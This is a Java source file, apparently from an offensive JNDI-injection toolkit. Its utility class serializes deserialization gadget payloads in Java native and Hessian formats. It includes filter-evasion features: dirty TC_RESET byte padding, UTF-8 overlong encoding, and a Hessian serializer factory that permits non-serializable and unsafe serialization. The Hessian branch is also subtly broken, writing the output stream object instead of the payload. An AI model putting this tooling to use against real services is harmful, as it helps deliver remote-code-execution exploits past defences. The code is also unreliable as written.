package com.qi4l.jndi.gadgets.utils;

import com.caucho.hessian.io.*;
import com.qi4l.jndi.gadgets.utils.utf8OverlongEncoding.UTF8OverlongObjectOutputStream;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.util.concurrent.Callable;

import static com.qi4l.jndi.gadgets.Config.Config.*;

public class Serializer implements Callable<byte[]> {
    private final Object object;

    public Serializer(Object object) {
        this.object = object;
    }

    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        serialize(obj, out);
        return out.toByteArray();
    }

    public static byte[] serialize(final Object obj, final ByteArrayOutputStream out) throws IOException {
        final ObjectOutputStream objOut;
        objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        byte[] bytes = out.toByteArray();
        objOut.close();
        return bytes;
    }

    public static void qiserialize(Object obj, final OutputStream out) throws Exception {
        ObjectOutputStream    objOut  = null;
        AbstractHessianOutput AobjOut = null;

        if (IS_DIRTY_IN_TC_RESET) {
            objOut = new SuObjectOutputStream(out);
        } else if (IS_UTF_Bypass) {
            objOut = new UTF8OverlongObjectOutputStream(out);
        } else if (IS_Hessian1) {
            AobjOut = new HessianOutput(out);
            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            AobjOut.setSerializerFactory(sf);
        } else if (IS_Hessian2) {
            AobjOut = new Hessian2Output(out);
            NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            AobjOut.setSerializerFactory(sf);
        }else {
            objOut = new ObjectOutputStream(out);
        }

        if (IS_Hessian1 || IS_Hessian2) {
            AobjOut.writeObject(AobjOut);
        } else {
            objOut.writeObject(obj);
        }
    }

    public byte[] call() throws Exception {
        return serialize(object);
    }

    public static class SuObjectOutputStream extends ObjectOutputStream {

        public SuObjectOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void writeStreamHeader() throws IOException {
            super.writeStreamHeader();
            try {
                // 写入
                for (int i = 0; i < DIRTY_LENGTH_IN_TC_RESET; i++) {
                    Reflections.getMethodAndInvoke(Reflections.getFieldValue(this, "bout"), "writeByte", new Class[]{int.class}, new Object[]{TC_RESET});
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static class NoWriteReplaceSerializerFactory extends SerializerFactory {

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)
         */
        @Override
        public com.caucho.hessian.io.Serializer getObjectSerializer (Class<?> cl ) throws HessianProtocolException {
            return super.getObjectSerializer(cl);
        }

        /**
         * {@inheritDoc}
         *
         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)
         */
        @Override
        public com.caucho.hessian.io.Serializer getSerializer (Class cl ) throws HessianProtocolException {
            com.caucho.hessian.io.Serializer serializer = super.getSerializer(cl);

            if ( serializer instanceof WriteReplaceSerializer ) {
                return UnsafeSerializer.create(cl);
            }
            return serializer;
        }
    }

}
